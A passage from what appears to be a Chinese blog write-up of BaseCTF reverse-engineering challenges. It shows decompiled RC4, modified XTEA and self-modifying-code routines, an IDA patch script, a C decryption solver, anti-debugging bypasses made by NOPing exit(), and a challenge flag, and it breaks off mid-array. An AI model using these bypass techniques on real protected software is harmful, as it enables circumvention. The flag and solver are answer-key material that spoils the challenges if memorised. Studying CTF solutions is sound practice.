class="line">    *(_BYTE *)(a1 + j) = j;</span><br><span class="line">    v10[j] = *(_BYTE *)(a2 + j % a3);</span><br><span class="line">  &#125;</span><br><span class="line">  v9 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt; <span class="number">256</span>; ++j )</span><br><span class="line">  &#123;</span><br><span class="line">    v9 = ((<span class="type">unsigned</span> __int8)v10[j] + *(<span class="type">unsigned</span> __int8 *)(a1 + j) + v9) % <span class="number">256</span>;</span><br><span class="line">    v11 = *(_BYTE *)(a1 + j);</span><br><span class="line">    *(_BYTE *)(a1 + j) = *(_BYTE *)(a1 + v9);</span><br><span class="line">    *(_BYTE *)(a1 + v9) = v11;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> sub_140011348(v6, &amp;unk_14001CCD0);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>RC4加密：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">sub_1400136E0</span><span class="params">(__int64 a1, <span class="type">unsigned</span> <span class="type">int</span> a2, __int64 a3, <span class="type">unsigned</span> <span class="type">int</span> a4)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> *v4; <span class="comment">// rdi</span></span><br><span class="line">  __int64 i; <span class="comment">// rcx</span></span><br><span class="line">  <span class="type">char</span> v7[<span class="number">32</span>]; <span class="comment">// [rsp+0h] [rbp-20h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v8[<span class="number">16</span>]; <span class="comment">// [rsp+20h] [rbp+0h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v9[<span class="number">276</span>]; <span class="comment">// [rsp+30h] [rbp+10h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v10; <span class="comment">// [rsp+144h] [rbp+124h]</span></span><br><span class="line">  <span class="type">int</span> v11; <span class="comment">// [rsp+164h] [rbp+144h]</span></span><br><span class="line">  <span class="type">int</span> v12; <span class="comment">// [rsp+184h] [rbp+164h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> j; <span class="comment">// [rsp+1A4h] [rbp+184h]</span></span><br><span class="line">  <span class="type">char</span> v14; <span class="comment">// [rsp+1C4h] [rbp+1A4h]</span></span><br><span class="line">  __int64 v15; <span class="comment">// [rsp+298h] [rbp+278h]</span></span><br><span class="line"></span><br><span class="line">  v4 = v8;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">114</span>i64; i; --i )</span><br><span class="line">  &#123;</span><br><span class="line">    *(_DWORD *)v4 = <span class="number">0xCCCCCCCC</span>;</span><br><span class="line">    v4 += <span class="number">4</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  sub_1400113B1(&amp;unk_1400250A4);</span><br><span class="line">  sub_14001130C(v9, a3, a4);</span><br><span class="line">  v10 = <span class="number">0</span>;</span><br><span class="line">  v11 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt; a2; ++j )</span><br><span class="line">  &#123;</span><br><span class="line">    v10 = (v10 + <span class="number">1</span>) % <span class="number">256</span>;</span><br><span class="line">    v11 = ((<span class="type">unsigned</span> __int8)v9[v10] + v11) % <span class="number">256</span>;</span><br><span class="line">    v14 = v9[v10];</span><br><span class="line">    v9[v10] = v9[v11];</span><br><span class="line">    v9[v11] = v14;</span><br><span class="line">    v12 = ((<span class="type">unsigned</span> __int8)v9[v11] + (<span class="type">unsigned</span> __int8)v9[v10]) % <span class="number">256</span>;</span><br><span class="line">    *(_BYTE *)(a1 + j) ^= v9[v12];</span><br><span class="line">  &#125;</span><br><span class="line">  sub_140011348(v7, &amp;unk_14001CD50);</span><br><span class="line">  <span class="keyword">return</span> sub_1400111D6((<span class="type">unsigned</span> __int64)v8 ^ v15);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>对smc的处理：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">sub_140013920</span><span class="params">(__int64 a1, <span class="type">unsigned</span> <span class="type">int</span> a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+24h] [rbp+4h]</span></span><br><span class="line"></span><br><span class="line">  sub_1400113B1(&amp;unk_1400250A4);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    result = a2;</span><br><span class="line">    <span class="keyword">if</span> ( i &gt;= (<span class="type">int</span>)a2 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    *(_BYTE *)(a1 + i) ^= <span class="number">0x81</span>u;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>处理t3xt段异或：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x140011000</span>,<span class="number">0x140012E00</span>):</span><br><span class="line"> patch_byte(i,get_wide_byte(i)^<span class="number">0x81</span>)</span><br></pre></td></tr></table></figure><p>恢复后，U，C，P来回倒腾。。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">sub_140011977</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> a1, <span class="type">unsigned</span> <span class="type">int</span> *a2, __int64 a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> i; <span class="comment">// [rsp+4h] [rbp-174h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v5; <span class="comment">// [rsp+24h] [rbp-154h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v6; <span class="comment">// [rsp+44h] [rbp-134h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v7; <span class="comment">// [rsp+64h] [rbp-114h]</span></span><br><span class="line">    </span><br><span class="line">  sub_1400113B1(&amp;unk_1400250A4);</span><br><span class="line">  v5 = *a2;</span><br><span class="line">  v6 = a2[<span class="number">1</span>];</span><br><span class="line">  v7 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; a1; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v5 += (v7 + *(_DWORD *)(a3 + <span class="number">4</span>i64 * (v7 &amp; <span class="number">3</span>)) + <span class="number">102</span>) ^ (v6 + ((v6 &gt;&gt; <span class="number">5</span>) ^ (<span class="number">16</span> * v6))) ^ <span class="number">0x88</span>;</span><br><span class="line">    v7 -= <span class="number">0x61C88647</span>;</span><br><span class="line">    v6 += (*(_DWORD *)(a3 + <span class="number">4</span>i64 * ((v7 &gt;&gt; <span class="number">11</span>) &amp; <span class="number">3</span>)) + v7) ^ (v5 + ((v5 &gt;&gt; <span class="number">5</span>) ^ (<span class="number">16</span> * v5))) ^ <span class="number">0x99</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  *a2 = v5;</span><br><span class="line">  result = <span class="number">4</span>i64;</span><br><span class="line">  a2[<span class="number">1</span>] = v6;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>是xtea</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">sub_140011420</span><span class="params">(__int64 a1, __int64 a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+4h] [rbp-F4h]</span></span><br><span class="line"> </span><br><span class="line">result = sub_1400113B1(&amp;unk_1400250A4);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="number">10</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( *(_DWORD *)(a1 + <span class="number">4</span>i64 * i) != *(_DWORD *)(a2 + <span class="number">4</span>i64 * i) )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0xFFFFFFFF</span>i64;</span><br><span class="line">    result = (<span class="type">unsigned</span> <span class="type">int</span>)(i + <span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br></pre></td></tr></table></figure><p>？xtea</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">sub_1400119A0</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> a1, <span class="type">unsigned</span> <span class="type">int</span> *a2, __int64 a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> i; <span class="comment">// [rsp+24h] [rbp+4h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v5; <span class="comment">// [rsp+44h] [rbp+24h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v6; <span class="comment">// [rsp+64h] [rbp+44h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v7; <span class="comment">// [rsp+84h] [rbp+64h]</span></span><br><span class="line"></span><br><span class="line">  sub_1400113B1(&amp;unk_1400250A4);</span><br><span class="line">  v5 = *a2;</span><br><span class="line">  v6 = a2[<span class="number">1</span>];</span><br><span class="line">  v7 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; a1; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v5 += (v7 + *(_DWORD *)(a3 + <span class="number">4</span>i64 * (v7 &amp; <span class="number">3</span>)) + <span class="number">102</span>) ^ (v6 + ((v6 &gt;&gt; <span class="number">5</span>) ^ (<span class="number">16</span> * v6))) ^ <span class="number">0x88</span>;</span><br><span class="line">    v7 -= <span class="number">0x61C88647</span>;</span><br><span class="line">    v6 += (*(_DWORD *)(a3 + <span class="number">4</span>i64 * ((v7 &gt;&gt; <span class="number">11</span>) &amp; <span class="number">3</span>)) + v7) ^ (v5 + ((v5 &gt;&gt; <span class="number">5</span>) ^ (<span class="number">16</span> * v5))) ^ <span class="number">0x99</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  *a2 = v5;</span><br><span class="line">  result = <span class="number">4</span>i64;</span><br><span class="line">  a2[<span class="number">1</span>] = v6;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 __fastcall <span class="title function_">sub_1400118D0</span><span class="params">(__int64 a1, <span class="type">unsigned</span> __int64 a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 i; <span class="comment">// [rsp+28h] [rbp+8h]</span></span><br><span class="line"></span><br><span class="line">  sub_1400113B1(&amp;unk_1400250A4);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>i64; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    result = a2;</span><br><span class="line">    <span class="keyword">if</span> ( i &gt;= a2 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    *(_DWORD *)(a1 + <span class="number">4</span> * i) = HIBYTE(*(_DWORD *)(a1 + <span class="number">4</span> * i)) | ((<span class="type">unsigned</span> __int8)BYTE2(*(_DWORD *)(a1 + <span class="number">4</span> * i)) &lt;&lt; <span class="number">8</span>) | ((<span class="type">unsigned</span> __int8)BYTE1(*(_DWORD *)(a1 + <span class="number">4</span> * i)) &lt;&lt; <span class="number">16</span>) | ((<span class="type">unsigned</span> __int8)*(_DWORD *)(a1 + <span class="number">4</span> * i) &lt;&lt; <span class="number">24</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>XTEA脚本：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* TEA 加密函数 */</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">encipher</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> num_rounds, <span class="type">uint32_t</span> *v, <span class="type">const</span> <span class="type">uint32_t</span> key[<span class="number">4</span>])</span> &#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> i;</span><br><span class="line">    <span class="type">uint32_t</span> v0 = v[<span class="number">0</span>], v1 = v[<span class="number">1</span>], sum = <span class="number">0</span>, delta = <span class="number">0x9E3779B9</span>;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; num_rounds; i++) &#123;</span><br><span class="line">        v0 += (((v1 &lt;&lt; <span class="number">4</span>) ^ (v1 &gt;&gt; <span class="number">5</span>)) + v1) ^ (sum + key[sum &amp; <span class="number">3</span>] + <span class="number">0x66</span>) ^ <span class="number">0x88</span>;</span><br><span class="line">        sum += delta;</span><br><span class="line">        v1 += (((v0 &lt;&lt; <span class="number">4</span>) ^ (v0 &gt;&gt; <span class="number">5</span>)) + v0) ^ (sum + key[(sum &gt;&gt; <span class="number">11</span>) &amp; <span class="number">3</span>]) ^ <span class="number">0x99</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    v[<span class="number">0</span>] = v0;</span><br><span class="line">    v[<span class="number">1</span>] = v1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* TEA 解密函数 */</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">decipher</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> num_rounds, <span class="type">uint32_t</span> *v, <span class="type">const</span> <span class="type">uint32_t</span> key[<span class="number">4</span>])</span> &#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> i;</span><br><span class="line">    <span class="type">uint32_t</span> v0 = v[<span class="number">0</span>], v1 = v[<span class="number">1</span>], delta = <span class="number">0x9E3779B9</span>, sum = delta * num_rounds;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; num_rounds; i++) &#123;</span><br><span class="line">        v1 -= (((v0 &lt;&lt; <span class="number">4</span>) ^ (v0 &gt;&gt; <span class="number">5</span>)) + v0) ^ (sum + key[(sum &gt;&gt; <span class="number">11</span>) &amp; <span class="number">3</span>]) ^ <span class="number">0x99</span>;</span><br><span class="line">        sum -= delta;</span><br><span class="line">        v0 -= (((v1 &lt;&lt; <span class="number">4</span>) ^ (v1 &gt;&gt; <span class="number">5</span>)) + v1) ^ (sum + key[sum &amp; <span class="number">3</span>] + <span class="number">0x66</span>) ^ <span class="number">0x88</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    v[<span class="number">0</span>] = v0;</span><br><span class="line">    v[<span class="number">1</span>] = v1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">uint32_t</span> v[<span class="number">10</span>] = &#123;<span class="number">0x36C40533</span>, <span class="number">0xB4C3BCE9</span>, <span class="number">0xB89B052B</span>, <span class="number">0xF4417985</span>, <span class="number">0xC6261DE0</span>, <span class="number">0xC9FB1734</span>, <span class="number">0xABC590D3</span>, <span class="number">0xC1002115</span>, <span class="number">0x88D3BE04</span>, <span class="number">0xC798B0DE</span>&#125;;</span><br><span class="line">    <span class="type">uint32_t</span> <span class="type">const</span> k[<span class="number">4</span>] = &#123;<span class="number">2</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">4</span>&#125;;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> r = <span class="number">64</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 解密数据块</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">5</span>; i++) &#123;</span><br><span class="line">        decipher(r, &amp;v[<span class="number">2</span> * i], k);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 输出解密后的十六进制结果</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; ++i) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;0x%08X, &quot;</span>, v[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 输出解密后的ASCII字符</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; ++i) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%c%c%c%c&quot;</span>, </span><br><span class="line">               (v[i] &gt;&gt; <span class="number">24</span>) &amp; <span class="number">0xFF</span>, </span><br><span class="line">               (v[i] &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xFF</span>, </span><br><span class="line">               (v[i] &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFF</span>, </span><br><span class="line">               v[i] &amp; <span class="number">0xFF</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="BaseRe"><a href="#BaseRe" class="headerlink" title="BaseRe"></a>BaseRe</h3><p>互补跳转花指令：<br><img src="https://xyy9233.oss-cn-beijing.aliyuncs.com/hexoblog/image-20241009112924761.png" alt="image-20241009112924761"></p><p>TLSCallback反调试：<br>挑了很久没干掉反调试，直接nop掉exit()</p><p><img src="https://xyy9233.oss-cn-beijing.aliyuncs.com/hexoblog/image-20241009130005735.png" alt="image-20241009130005735"></p><p><img src="https://xyy9233.oss-cn-beijing.aliyuncs.com/hexoblog/image-20241009125128515.png" alt="image-20241009125128515"></p><h3 id="Dont-debug-me"><a href="#Dont-debug-me" class="headerlink" title="Dont-debug-me"></a>Dont-debug-me</h3><p><img src="https://xyy9233.oss-cn-beijing.aliyuncs.com/hexoblog/image-20241009133617354.png" alt="image-20241009133617354"></p><p>BaseCTF{8ea2710a717f89d83af695d312fe3b625df14a6ba6b3a74e15ed1e2d35cb10}</p><h3 id="EZVM"><a href="#EZVM" class="headerlink" title="*EZVM"></a>*EZVM</h3><p>pyinstaller打包的linux可执行文件，序列号应该是flag</p><p>main.pyc:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Source Generated with Decompyle++</span></span><br><span class="line"><span class="comment"># File: 123.pyc (Python 3.10)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> what</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">_6f4d0e83</span>(<span class="params">serial</span>):</span><br><span class="line">    _359d3c18 = what._fdd4e0af()</span><br><span class="line">    _1b5598dc = _359d3c18._55d43f6f(serial)</span><br><span class="line">    <span class="keyword">return</span> what._c3a786e1 == _1b5598dc</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">_8ecf2044</span>():</span><br><span class="line">    _dca32e81 = <span class="built_in">input</span>(<span class="string">&#x27;璇疯緭鍏ュ簭鍒楀彿锛?</span></span><br></pre></td></tr></table></figure><p>中文被截断了…，不过用的是what库，去看看</p><p>what.pyc:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br></pre></td><td class="code"><pre><span class="line">_c3a786e1 = [<span class="number">35</span>,<span class="number">18</span>,<span class="number">22</span>,<span class="number">38</span>,<span class="number">23</span>,<span class="number">18</span>,<span class="number">61</span>,<span class="number">25</span>,<span class="number">83</span>,<span class="number">4</span>,<span class="number">0</span>,<span class="number">5</span>,<span class="number">5</span>,<span class="number">83</span>,<span class="number">95</span>,<span class="number">20</span>,<span class="number">29</span>,<span class="number">83</span>,<span class="number">82</span>,<span class="number">1</span>,<span class="number">29</span>,<span class="number">25</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">81</span>,<span class="number">72</span>,<span class="number">76</span>,<span class="number">85</span>,<span class="number">3</span>,<span class="number">85</span>,<span class="number">79</span>,<span class="number">73</span>,<span class="number">83</span>,<span class="number">0</span>,<span class="number">15</span>,<span class="number">9</span>,<span class="number">85</span>,<span class="number">7</span>,<span class="number">80</span>,<span class="number">82</span>,<span class="number">0</span>,<span class="number">5</span>,<span class="number">84</span>,<span class="number">77</span>,<span 